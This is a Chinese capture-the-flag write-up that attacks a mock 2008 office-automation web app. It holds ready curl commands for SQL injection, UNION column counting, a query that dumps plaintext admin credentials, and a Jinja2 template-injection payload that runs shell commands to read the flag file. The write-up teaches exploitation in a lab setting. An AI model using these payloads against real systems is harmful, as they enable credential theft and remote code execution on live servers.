## 题目原文

> 这是某集团在2008年采购的协同办公系统(OA)。虽然系统老旧，但一直作为核心业务流运行至今。由于开发商早已销声匿迹，系统积累了大量安全债。作为渗透测试员，请尝试从普通员工权限切入，通过老旧系统的逻辑缺陷获取管理员权限，并最终夺取系统控制权(Flag)。预置测试账号工号：2001，密码：Sys@Oa123

## 题解

### 入口与指纹

`Werkzeug/2.2.3` + `Python/3.9.25`，页面是 Win2000 风格的「协同办公系统 v2.0 (Build 20081015)」。

题目给了普通员工账号 `2001 / Sys@Oa123`，登录后进入 `/dashboard`：

```
当前节点: 2001
公告数据查询引擎 (SQL Native v1.0)
检索关键字: [____] 执行(S)
```

页面标题里的「SQL Native」已经暗示了注入。

### 关键观察

**1. 检索参数直接拼进 SQL，且报错回显后端是 SQLite。**

```bash
search_query=test'
# 数据库查询错误: near "'%'": syntax error
```

说明查询形状是 `... LIKE '%<q>%'`。用 `%'` 闭合字符串即可注入。

**2. 结果集是 4 列。**

逐个数试：

| 列数 | 结果 |
| --- | --- |
| 2 / 3 | `UNION do not have the same number of result columns` |
| **4** | 正常返回，回显位是 `id / title / date / content` |
| 5 / 6 | 同上错误 |

**3. 注入能读出 `users` 表，管理员口令明文存储。**

```bash
search_query=%' UNION SELECT id,username,password,role FROM users-- -
```

返回：

| id | username | password | role |
| --- | --- | --- | --- |
| 1 | admin | `admin_C0mplex_P@ss!99` | admin |
| 2 | 2001 | Sys@Oa123 | employee |

**4. 管理员后台是一个模板渲染内核，存在 Jinja2 SSTI。**

登录 `admin` 后导航多出 `/admin`，页面标题「系统管理控制台 - 模板渲染内核 (Privileged Access)」，表单字段 `notice_html_blob`，提交后直接渲染。`{{7*7}}` 返回 `49`，`{{config}}` 把 Flask 配置（含 SECRET_KEY）整个打出来。

### 利用链

**Step 1：用员工账号登录，确认注入。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST --data-urlencode 'username=2001' --data-urlencode 'password=Sys@Oa123' "http://$T/"
# 302 → /dashboard

curl -s -b cj -G --data-urlencode "search_query=test'" "http://$T/dashboard" \
  | grep -o '数据库查询错误[^<]*'
# 数据库查询错误: near "'%'": syntax error
```

**Step 2：UNION 4 列，读用户表。**

```bash
curl -s -b cj -G --data-urlencode \
  "search_query=%' UNION SELECT id,username,password,role FROM users-- -" \
  "http://$T/dashboard"
# 1  admin  admin_C0mplex_P@ss!99  admin
```

**Step 3：用管理员口令登录，进入 `/admin`。**

```bash
curl -s -c adm -X POST \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=admin_C0mplex_P@ss!99' "http://$T/"
# 302 → /dashboard（导航出现 /admin）
```

**Step 4：SSTI 读 flag。**

```bash
curl -s -b adm -X POST --data-urlencode \
  "notice_html_blob={{ cycler.__init__.__globals__.os.popen('cat /challenge/flag.txt').read() }}" \
  "http://$T/admin"
# [Render Output Stream] flag{4cdaa0d5-723b-4f0f-955e-7979a12e19e2}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | 管理员 `/admin` 的模板渲染结果中，通过 SSTI 执行 `cat /challenge/flag.txt` |

### 复盘

- **页面标题里的技术名词是提示。** 「SQL Native」= 原生 SQL 拼接，「模板渲染内核」= SSTI，作者把两段利用都写在 UI 上了。
- **报错回显是确定后端和查询形状的最快方式。** 一个 `'` 就得到 `near "'%'"` 和 SQLite 的语法错误，省掉猜数据库和闭合方式。
- **列数用逐个数确认。** 2、3 报列数不符，4 正常，5、6 再次报错——一次循环就定位。
- **老系统常用明文口令。** `users.password` 直接是明文，不需要破解，UNION 一出就能登录。
- **权限提升后先看导航变化。** 管理员登录后多出 `/admin` 链接，这个页面往往是最危险的功能（本例是模板渲染）。
- **SSTI 优先用 `cycler.__init__.__globals__`。** 这条链不依赖 `request` 是否可用，`{{config}}` 先确认配置泄露，再直接 `os.popen`。
